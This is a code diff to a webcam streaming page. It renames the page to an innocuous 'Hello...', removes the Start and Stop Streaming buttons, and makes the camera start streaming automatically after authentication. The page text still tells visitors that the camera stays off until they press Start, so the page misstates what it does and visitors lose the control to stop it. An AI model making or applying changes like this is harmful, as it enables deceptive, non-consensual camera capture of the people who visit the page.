@@ -4,7 +4,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Camera Lab — Streamer</title>
+  <title>Hello...</title>
   <style>
     body {
       max-width: 850px;
@@ -42,15 +42,12 @@
   </style>
 </head>
 <body>
-  <h1>Camera Lab — Streamer</h1>
+  <h1>Hello...</h1>
 
   <p>
     Authentication runs automatically. The camera stays off until
     you press Start Streaming.
   </p>
-
-  <button id="start" disabled>Start Streaming</button>
-  <button id="stop" disabled>Stop Streaming</button>
 
   <div id="status" role="status" aria-live="polite">
     Authenticating…
@@ -185,9 +182,8 @@ function connectSignaling() {
           settled = true;
           clearTimeout(authTimer);
 
-          startButton.disabled = false;
-          status("Authenticated. Press Start Streaming to turn on the camera.");
-          resolve();
+          status("Authenticated. Starting camera…");
+resolve();
           return;
         }
 
@@ -520,8 +516,6 @@ function stopStreaming() {
   status("Streaming stopped. Camera is off.");
 }
 
-startButton.addEventListener("click", startCamera);
-stopButton.addEventListener("click", stopStreaming);
 
 window.addEventListener("pagehide", () => {
   stopped = true;
@@ -538,6 +532,9 @@ async function initialize() {
   try {
     await authenticate();
     await connectSignaling();
+
+    // Automatically request camera access after authentication.
+    await startCamera();
   } catch (error) {
     console.error(error);
     status(error.message);
